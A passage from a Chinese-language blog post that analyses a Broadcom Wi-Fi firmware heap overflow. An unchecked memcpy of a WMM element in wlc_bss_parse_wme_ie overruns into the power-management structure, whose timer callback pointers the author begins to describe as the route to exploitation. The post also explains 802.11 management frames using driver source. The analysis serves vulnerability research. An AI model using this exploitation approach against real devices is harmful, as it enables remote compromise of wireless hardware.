arg-&gt;bsscfg</span></div><div class="line">  v4 = wlc;</div><div class="line">  ie = *(<span class="variable">_DWORD</span> *)(arg + <span class="number">0</span>xC);                  <span class="comment">// arg-&gt;ie</span></div><div class="line">  current_wmm_ie = *(<span class="variable">_BYTE</span> **)(cfg + <span class="number">0</span>x354);    <span class="comment">// cfg-&gt;current_wmm_ie</span></div><div class="line">  <span class="keyword">if</span> ( frame_type == <span class="number">0</span>x20 )                     <span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    <span class="built_in">goto</span> LABEL_9;</div><div class="line">  <span class="keyword">if</span> ( frame_type &lt;= <span class="number">0</span>x20 )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( *(<span class="variable">_WORD</span> *)(arg + <span class="number">8</span>) )</div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( frame_type != <span class="number">0</span>x10 )                 <span class="comment">// FC_ASSOC_RESP  = 0x10  //关联帧 </span></div><div class="line">        return <span class="number">0</span>;</div><div class="line">      <span class="built_in">goto</span> LABEL_15;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> ( frame_type != <span class="number">0</span>x30 )                     <span class="comment">// FC_REASSOC_RESP = 0x30 重新关联响应帧</span></div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( frame_type == <span class="number">0</span>x80 )                   <span class="comment">// FC_BEACON = 0x80 信标帧</span></div><div class="line">    &#123;</div><div class="line">      v16 = **(<span class="variable">_DWORD</span> **)(*(<span class="variable">_DWORD</span> *)arg + <span class="number">0</span>x1C);</div><div class="line">      <span class="keyword">if</span> ( *(<span class="variable">_DWORD</span> *)(*(<span class="variable">_DWORD</span> *)wlc + <span class="number">0</span>x34) )</div><div class="line">      ...</div><div class="line">      ...</div><div class="line">      ...</div></pre></td></tr></table></figure>
<h2 id="Wlan知识普及"><a href="#Wlan知识普及" class="headerlink" title="Wlan知识普及"></a>Wlan知识普及</h2><p>1）802.11数据包类型</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span> 数据: 数据数据包的作用是用来携带更高层次的数据(如IP数据包，ISO7层协议)。</div><div class="line">它负责在工作站之间传输数据</div><div class="line"></div><div class="line"><span class="number">2.</span> 管理: 管理数据包控制网络的管理功能</div><div class="line">    <span class="number">1</span>) 信标帧(Beacons): 在无线设备中，定时依次按指定间隔发送的有规律的无线信号(类似心跳包)，主要用于定位和同步使用</div><div class="line">    <span class="number">2</span>) 解除认证(Deauthentication)数据包 </div><div class="line">    <span class="number">3</span>) Probe(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)探测包</div><div class="line">    <span class="number">4</span>) Authenticate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)身份认证</div><div class="line">    <span class="number">5</span>) Associate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)关联</div><div class="line">    <span class="number">6</span>) Reassociate(<span class="built_in">request</span> <span class="keyword">and</span> <span class="built_in">response</span>)重新关联</div><div class="line">    <span class="number">7</span>) Dissassociate(notify) 解除关联</div><div class="line">管理帧负责监督，主要用来加入或退出无线网络，以及处理接入点之间连接的转移事宜</div><div class="line"></div><div class="line"><span class="number">3.</span> 控制: 控制数据包得名于术语<span class="string">"媒体接入控制(Media Access Control, MAC)"</span>，是用来控制对共享媒体(即物理媒介，如光缆)的访问</div><div class="line">    <span class="number">1</span>) 请求发送(<span class="built_in">Request</span> <span class="keyword">To</span> Send，RTS)数据包</div><div class="line">    <span class="number">2</span>) 清除发送(Clear <span class="keyword">To</span> Send，CTS)数据包</div><div class="line">    <span class="number">3</span>) ACK确认(RTS/CTS)  </div><div class="line">    <span class="number">4</span>) PS-Poll: 当一部移动工作站从省电模式中苏醒，便会发送一个 PS-Poll 帧给基站，以取得任何暂存帧 </div><div class="line">控制帧通常与数据帧搭配使用，负责区域的清空、信道的取得以及载波监听的维护，并于收到数据时予以正面的应答，借此促进工作站间数据传输的可靠性</div></pre></td></tr></table></figure>
<h2 id="wifi驱动发送管理帧数据包流程"><a href="#wifi驱动发送管理帧数据包流程" class="headerlink" title="wifi驱动发送管理帧数据包流程"></a>wifi驱动发送管理帧数据包流程</h2><p>总共定位到一处位置：</p>
<p>是在kernel中发送数据包的过程<br>在\VMG1312-B-master\VMG1312-B-master\kernel\linux\drivers\staging\otus\80211core\cmm.c 中的函数 void zfSendMmFrame(zdev_t<em> dev, u8_t frameType, u16_t</em> dst,<br>                   u32_t p1, u32_t p2, u32_t p3)中实现<br>wlan连接过程：<br>    STA (工作站）启动初始化、开始正式使用、AP 传送数据幀之前，要经过三个阶段才能接入:<br>    (1) 扫描(SCAN)<br>    (2) 认证(Authentication)<br>    (3) 关联(Association) </p>
<p>1）探测帧</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_PROBEREQ :<span class="comment">//构造探测帧</span></div><div class="line">            <span class="keyword">offset</span> = zfSendProbeReq(dev, buf, <span class="keyword">offset</span>, (u8_t) p1);<span class="comment">//探测请求</span></div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>2）探测响应帧</p>
<p>构造探测响应帧时有WME参数部分<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">case ZM_WLAN_FRAME_TYPE_PROBERSP : <span class="comment">//探测响应帧</span></div><div class="line">            zm_msg0_mm(ZM_LV_3, <span class="string">"probe rsp"</span>);</div><div class="line">            <span class="comment">/* 24-31 Time Stamp : hardware WON'T fill this field */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">2</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">4</span>, <span class="number">0</span>);</div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="built_in">offset</span>+<span class="number">6</span>, <span class="number">0</span>);</div><div class="line">            <span class="built_in">offset</span>+=<span class="number">8</span>;</div><div class="line">...</div><div class="line">...</div><div class="line">..</div><div class="line"> <span class="comment">/* WME Parameters */</span></div><div class="line">            <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">            &#123;</div><div class="line">                <span class="keyword">if</span> (wd-&gt;ap.qosMode == <span class="number">1</span>)</div><div class="line">                &#123;</div><div class="line">                    <span class="built_in">offset</span> = zfApAddIeWmePara(dev, buf, <span class="built_in">offset</span>, vap);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ( wd-&gt;wlanMode != ZM_MODE_IBSS )</div><div class="line">            &#123;</div><div class="line">            <span class="comment">// jhlee HT 0</span></div><div class="line">            <span class="comment">//CWYang(+)</span></div><div class="line">                <span class="comment">/* TODO : Need to check if it is ok */</span></div><div class="line">            <span class="comment">/* HT Capabilities Info */</span></div><div class="line">            <span class="built_in">offset</span> = zfMmAddHTCapability(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            <span class="comment">//CWYang(+)</span></div><div class="line">            <span class="comment">/* Extended HT Capabilities Info */</span></div><div class="line">            <span class="built_in">offset</span> = zfMmAddExtendedHTCapability(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">if</span> ( wd-&gt;sta.ibssAdditionalIESize )</div><div class="line">                <span class="built_in">offset</span> = zfStaAddIbssAdditionalIE(dev, buf, <span class="built_in">offset</span>);</div><div class="line">            break;</div></pre></td></tr></table></figure></p>
<p>3）身份认证</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_AUTH :<span class="comment">//身份认证</span></div><div class="line">            <span class="keyword">if</span> (p1 == <span class="number">0x30001</span>)</div><div class="line">            &#123;</div><div class="line">                hlen += <span class="number">4</span>;</div><div class="line">                <span class="keyword">offset</span> += <span class="number">4</span>;        <span class="comment">// for reserving wep header</span></div><div class="line">                encrypt = <span class="number">1</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="comment">/* Algotrithm Number */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p1&amp;<span class="number">0xffff</span>));</div><div class="line">            <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">            <span class="comment">/* Transaction Number */</span></div><div class="line">            zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p1&gt;&gt;<span class="number">16</span>));</div><div class="line">            <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">...</div><div class="line">..</div><div class="line">..</div><div class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (p1 == <span class="number">0x30001</span>)</div><div class="line">            &#123;</div><div class="line">                <span class="comment">/* share-3 : STA return challenge Text */</span></div><div class="line">                zfCopyToIntTxBuffer(dev, buf, wd-&gt;sta.challengeText, <span class="keyword">offset</span>, wd-&gt;sta.challengeText[<span class="number">1</span>]+<span class="number">2</span>);</div><div class="line">                <span class="keyword">offset</span> += (wd-&gt;sta.challengeText[<span class="number">1</span>]+<span class="number">2</span>);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>4）关联请求/重新关联请求<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ASOCREQ :<span class="comment">//关联请求帧</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_REASOCREQ :  <span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    <span class="comment">/* Capability */</span></div><div class="line">    zmw_tx_buf_writeb(dev, buf, <span class="keyword">offset</span>++, wd-&gt;sta.capability[<span class="number">0</span>]);</div><div class="line">    zmw_tx_buf_writeb(dev, buf, <span class="keyword">offset</span>++, wd-&gt;sta.capability[<span class="number">1</span>]);</div><div class="line"></div><div class="line">    <span class="comment">/* Listen Interval */</span>  <span class="comment">//监听间隔</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, <span class="number">0x0005</span>);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Reassocaited Request : Current AP address */</span></div><div class="line">    <span class="keyword">if</span> (frameType == ZM_WLAN_FRAME_TYPE_REASOCREQ)<span class="comment">// FC_REASSOC_REQ = 0x20 重新关联请求帧</span></div><div class="line">    &#123;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">1</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;sta.bssid[<span class="number">2</span>]);</div><div class="line">        <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    &#125;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    </div><div class="line">    <span class="comment">//Store asoc request frame body, for VISTA only</span></div><div class="line">    wd-&gt;sta.asocReqFrameBodySize = ((<span class="keyword">offset</span> - hlen) &gt;</div><div class="line">            ZM_CACHED_FRAMEBODY_SIZE)?</div><div class="line">            ZM_CACHED_FRAMEBODY_SIZE:(<span class="keyword">offset</span> - hlen);</div><div class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;wd-&gt;sta.asocReqFrameBodySize; i++)</div><div class="line">    &#123;</div><div class="line">        wd-&gt;sta.asocReqFrameBody[i] = zmw_tx_buf_readb(dev, buf, i + hlen);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>5）关联响应/重新关联响应</p>
<p>这部分也有WME的相关参数构造<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ASOCRSP :<span class="comment">//关联响应帧</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_REASOCRSP :<span class="comment">// 重新关联响应帧</span></div><div class="line">    vap = (u16_t) p3;</div><div class="line"></div><div class="line">    <span class="comment">/* Capability */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, wd-&gt;ap.capab[vap]);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* Status Code */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)p1);</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line"></div><div class="line">    <span class="comment">/* AID */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, <span class="keyword">offset</span>, (u16_t)(p2|<span class="number">0xc000</span>));</div><div class="line">    <span class="keyword">offset</span>+=<span class="number">2</span>;</div><div class="line">    ...</div><div class="line">    ...</div><div class="line">    ...</div><div class="line"><span class="comment">/* WME Parameters */</span></div><div class="line">    <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">/* TODO : if WME STA then send WME parameter element */</span></div><div class="line">        <span class="keyword">if</span> (wd-&gt;ap.qosMode == <span class="number">1</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">offset</span> = zfApAddIeWmePara(dev, buf, <span class="keyword">offset</span>, vap);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">// jhlee HT 0</span></div><div class="line">    <span class="comment">//CWYang(+)</span></div><div class="line">    <span class="comment">/* HT Capabilities Info */</span></div><div class="line">    <span class="keyword">offset</span> = zfMmAddHTCapability(dev, buf, <span class="keyword">offset</span>);</div><div class="line">    <span class="comment">//CWYang(+)</span></div><div class="line">    <span class="comment">/* Extended HT Capabilities Info */</span></div><div class="line">    <span class="keyword">offset</span> = zfMmAddExtendedHTCapability(dev, buf, <span class="keyword">offset</span>);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>6）通知传输指示信息<br><figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_ATIM :<span class="comment">//通知传输指示消息</span></div><div class="line">            <span class="comment">/* NULL frame */</span></div><div class="line">            <span class="comment">/* TODO : add two dumb bytes temporarily */</span></div><div class="line">            <span class="keyword">offset</span> += <span class="number">2</span>;</div><div class="line">            <span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>7）QoS帧/数据帧</p>
<figure class="highlight glsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> <span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_QOS_NULL :</div><div class="line">            zmw_buf_writeh(dev, buf, <span class="keyword">offset</span>, <span class="number">0x0010</span>);</div><div class="line">            <span class="keyword">offset</span> += <span class="number">2</span>;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line"><span class="keyword">case</span> ZM_WLAN_DATA_FRAME :</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>8）解除关联/解除认证</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_DISASOC :<span class="comment">//解除关联</span></div><div class="line"><span class="keyword">case</span> ZM_WLAN_FRAME_TYPE_DEAUTH :<span class="comment">//解除认证</span></div><div class="line">    <span class="keyword">if</span> (wd-&gt;wlanMode == ZM_MODE_AP)</div><div class="line">    &#123;</div><div class="line">      vap = (u16_t) p3;</div><div class="line"></div><div class="line">      <span class="keyword">if</span> ((aid = zfApFindSta(dev, dst)) != <span class="number">0xffff</span>)</div><div class="line">      &#123;</div><div class="line">          zmw_enter_critical_section(dev);</div><div class="line">          <span class="comment">/* Clear STA table */</span></div><div class="line">          wd-&gt;ap.staTable[aid].valid = <span class="number">0</span>;</div><div class="line"></div><div class="line">          zmw_leave_critical_section(dev);</div><div class="line"></div><div class="line">          <span class="keyword">if</span> (wd-&gt;zfcbDisAsocNotify != <span class="keyword">NULL</span>)</div><div class="line">          &#123;</div><div class="line">              wd-&gt;zfcbDisAsocNotify(dev, (u8_t*)dst, vap);</div><div class="line">          &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* Reason Code */</span></div><div class="line">    zmw_tx_buf_writeh(dev, buf, offset, (u16_t)p1);</div><div class="line">    offset+=<span class="number">2</span>;</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>在wifi连接过程中主要有这些数据包种类</p>
<p>9）发送数据包<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">zfwBufSetSize</span>(dev, buf, offset);<span class="comment">//拷贝构造好的数据包到dev</span></div><div class="line"></div><div class="line"><span class="selector-tag">zm_msg2_mm</span>(ZM_LV_2, <span class="string">"management frame body size="</span>, offset-hlen);</div><div class="line"></div><div class="line"><span class="comment">//Copy wlan header</span></div><div class="line"><span class="selector-tag">zfTxGenMmHeader</span>(dev, frameType, dst, header, offset-hlen, buf, vap, encrypt);<span class="comment">//发送数据包过程</span></div></pre></td></tr></table></figure></p>
<h2 id="Wifi固件接收到管理帧的处理过程"><a href="#Wifi固件接收到管理帧的处理过程" class="headerlink" title="Wifi固件接收到管理帧的处理过程"></a>Wifi固件接收到管理帧的处理过程</h2><p>我们关注的还是漏洞触发位置的重新关联响应帧</p>
<p>1）解析重新关联响应帧时造成溢出的过程</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">void wlc_bss_parse_wme_ie(wlc_info *wlc, ie_parser_arg *arg) &#123;</div><div class="line">  unsigned int frame_type;  </div><div class="line">  wlc_bsscfg *cfg;  </div><div class="line">  bcm_tlv *ie;  </div><div class="line">  unsigned char *current_wmm_ie;  </div><div class="line">  int flags;</div><div class="line">  <span class="function"><span class="title">frame_type</span> = arg-&gt;</span>frame_type;  </div><div class="line">  <span class="function"><span class="title">cfg</span> = arg-&gt;</span>bsscfg;  </div><div class="line">  <span class="function"><span class="title">ie</span> = arg-&gt;</span>ie;  </div><div class="line">  <span class="function"><span class="title">current_wmm_ie</span> = cfg-&gt;</span>current_wmm_ie;  </div><div class="line">  <span class="keyword">if</span> ( frame_type == FC_REASSOC_REQ ) &#123;    </div><div class="line">    ...    </div><div class="line">    &lt;handle reassociation requests&gt;    </div><div class="line">    ...  &#125;  </div><div class="line">  <span class="keyword">if</span> ( frame_type == FC_ASSOC_RESP ) &#123;    </div><div class="line">    ...    </div><div class="line">    <span class="function"><span class="title">if</span> ( wlc-&gt;</span><span class="function"><span class="title">pub</span>-&gt;</span>_wme ) &#123;      </div><div class="line">      <span class="keyword">if</span> ( !(flags &amp; <span class="number">2</span>) ) &#123;        </div><div class="line">        ...        </div><div class="line">        <span class="keyword">if</span> ( ie ) &#123;          </div><div class="line">          ...          </div><div class="line">          <span class="function"><span class="title">cfg</span>-&gt;</span>flags |= <span class="number">0</span>x100u;          </div><div class="line">          <span class="function"><span class="title">memcpy</span>(current_wmm_ie, ie-&gt;</span><span class="function"><span class="title">data</span>, ie-&gt;</span>len);</div></pre></td></tr></table></figure>
<p>2)溢出的位置确定</p>
<p>溢出的位置是current_wmm_ie的下一个结构体wlc-&gt;pm</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">wlc_bsscfg *wlc_bsscfg_malloc(wlc_info *wlc) &#123;  </div><div class="line">  wlc_info *wlc<span class="comment">;  </span></div><div class="line">  wlc_bss_info *current_bss<span class="comment">;  </span></div><div class="line">  wlc_bss_info *target_bss<span class="comment">;  </span></div><div class="line">  wlc_pm_st *pm<span class="comment">;  </span></div><div class="line">  wmm_ie *current_wmm_ie<span class="comment">;</span></div><div class="line">  ...  </div><div class="line">  current_bss = wlc_calloc(<span class="number">0x124</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;current_bss = current_bss<span class="comment">;  </span></div><div class="line">  if ( !current_bss ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  target_bss = wlc_calloc(<span class="number">0x124</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;target_bss = target_bss<span class="comment">;  </span></div><div class="line">  if ( !target_bss ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  pm = wlc_calloc(<span class="number">0x78</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;pm = pm<span class="comment">;  </span></div><div class="line">  if ( !pm ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;  </span></div><div class="line">  current_wmm_ie = wlc_calloc(<span class="number">0x2C</span>)<span class="comment">;  </span></div><div class="line">  wlc-&gt;current_wmm_ie = current_wmm_ie<span class="comment">;  </span></div><div class="line">  if ( !current_wmm_ie ) &#123;    </div><div class="line">    goto fail<span class="comment">;  &#125;</span></div></pre></td></tr></table></figure>
<p>3）溢出结构体类型</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct wlc_pm_st &#123; </div><div class="line">  uint8 PM<span class="comment">; bool PM_override; </span></div><div class="line">  mbool PMenabledModuleId<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMenabled<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMawakebcn<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PMpending<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>priorPMstate<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>PSpoll<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>check_for_unaligned_tbtt<span class="comment">; </span></div><div class="line">  uint16 pspoll_prd<span class="comment">; </span></div><div class="line">  struct wl_timer *pspoll_timer<span class="comment">; </span></div><div class="line">  uint16 apsd_trigger_timeout<span class="comment">; </span></div><div class="line">  struct wl_timer *apsd_trigger_timer<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>apsd_sta_usp<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>WME_PM_blocked<span class="comment">; </span></div><div class="line">  uint16 pm2_rcv_percent<span class="comment">; </span></div><div class="line">  pm2rd_state_t pm2_rcv_state<span class="comment">; </span></div><div class="line">  uint16 pm2_rcv_time<span class="comment">; </span></div><div class="line">  uint pm2_sleep_ret_time<span class="comment">; </span></div><div class="line">  uint pm2_sleep_ret_time_left<span class="comment">;  </span></div><div class="line">  uint pm2_last_wake_time<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>pm2_refresh_badiv<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>adv_ps_poll<span class="comment">; </span></div><div class="line">  <span class="keyword">bool </span>send_pspoll_after_tx<span class="comment">;    </span></div><div class="line">  wlc_hwtimer_to_t *pm2_rcv_timer<span class="comment">;  </span></div><div class="line">  wlc_hwtimer_to_t *pm2_ret_timer<span class="comment">; </span></div><div class="line">&#125; wlc_pm_st_t<span class="comment">;</span></div></pre></td></tr></table></figure>
<p>4）漏洞利用方式</p>
<p>struct wlc_pm_st结构体中 wl_timer 类型的pspoll_timer、  apsd_trigger_timer，和wlc_hwtimer_to_t 类型的pm2_rcv_timer、  pm2_ret_timer。<br>wl_timer的 pspoll_timer 成员。这个结构体能在相关过程中定期触发的回调函数进行处理：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">int timer_func(struct wl_timer *t) &#123;  </div><div class="line">  prev_cpsr = j_disable_irqs();  </div><div class="line">  <span class="function"><span class="title">v3</span> = t-&gt;</span>field_20;    </div><div class="line">  ...</div><div class="line">  <span class="keyword">if</span> ( v3 ) &#123;    